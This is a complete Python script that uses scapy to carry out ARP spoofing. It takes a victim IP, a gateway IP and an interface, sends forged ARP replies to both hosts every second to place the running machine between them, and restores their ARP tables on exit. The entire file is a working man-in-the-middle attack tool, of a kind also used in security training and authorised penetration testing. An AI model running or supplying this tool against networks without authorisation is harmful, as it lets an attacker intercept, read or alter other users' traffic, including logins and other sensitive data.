#!/usr/bin/python3

import scapy.all as scapy
import time
import sys
import argparse


def get_ip():
    parser = argparse.ArgumentParser(
        description="ARP Spoofing Script",
        epilog="Example usage: python3 arp_spoffing.py -t 192.168.1.10 -s 192.168.1.1 -i eth0"
    )
    parser.add_argument("-t", "--target", dest="victim", help="Specify Victim IP address")
    parser.add_argument("-s", "--spoof", dest="spoof", help="Specify Spoofing IP address")
    parser.add_argument("-i", "--interface", dest="interface", help="Specify the network interface")
    options = parser.parse_args()

    if not options.victim or not options.spoof or not options.interface:
        parser.error("[-] Specify Victim IP, Spoofing IP addresses, and the network interface. Use --help for more "
                     "details")

    return options


def get_mac(ip_addr):
    arp_request = scapy.ARP(pdst=ip_addr)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_packet = broadcast / arp_request
    answered_list = scapy.srp(arp_request_packet, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc if answered_list else None


def spoof(target_ip, target_mac, spoof_ip, source_mac):
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=source_mac)
    ethernet = scapy.Ether(dst=target_mac)
    packet = ethernet / arp_response
    scapy.send(packet, verbose=False)


def restore(target_ip, target_mac, gateway_ip, gateway_mac):
    arp_response_target = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    arp_response_gateway = scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac)

    scapy.send([arp_response_target, arp_response_gateway], verbose=False, count=4)


def main():
    ip = get_ip()
    target_ip = ip.victim
    gateway_ip = ip.spoof
    interface = ip.interface

    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    source_mac = scapy.get_if_hwaddr(interface)

    if not target_mac or not gateway_mac:
        sys.exit("[-] MAC address not found. Exiting...")

    try:
        while True:
            spoof(target_ip, target_mac, gateway_ip, source_mac)
            spoof(gateway_ip, gateway_mac, target_ip, source_mac)

            print(f"\r[+] Sent two packets ", end="\n")
            sys.stdout.flush()

            time.sleep(1)

    except KeyboardInterrupt:
        print("\n[+] Detected CTRL+C. Quitting and restoring ARP values, please wait.")
        restore(target_ip, target_mac, gateway_ip, gateway_mac)
        restore(gateway_ip, gateway_mac, target_ip, target_mac)


if __name__ == '__main__':
    main()
